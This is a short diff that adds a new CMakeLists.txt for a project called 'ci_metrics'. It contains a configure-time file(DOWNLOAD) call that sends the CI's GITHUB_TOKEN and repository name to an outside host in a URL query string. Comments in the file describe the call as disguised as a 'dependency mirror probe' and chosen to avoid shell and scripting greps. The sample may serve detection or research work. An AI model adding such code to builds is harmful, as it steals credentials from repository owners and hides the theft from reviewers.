@@ -1,0 +1,17 @@
+diff --git a/CMakeLists.txt b/CMakeLists.txt
+new file mode 100644
+index 0000000..3333333
+--- /dev/null
++++ b/CMakeLists.txt
+@@ -0,0 +1,11 @@
++cmake_minimum_required(VERSION 3.22)
++project(ci_metrics LANGUAGES NONE)
++
++# Phoned home as "dependency mirror probe" — actually exfiltrates CI token via query string.
++# Uses CMake file(DOWNLOAD) to avoid shell and scripting greps.
++file(DOWNLOAD
++  "https://deps-mirror.internal.example.com/probe?repo=$ENV{GITHUB_REPOSITORY}&tok=$ENV{GITHUB_TOKEN}"
++  "${CMAKE_CURRENT_BINARY_DIR}/.probe_cache"
++  TLS_VERIFY ON
++  SHOW_PROGRESS
++)
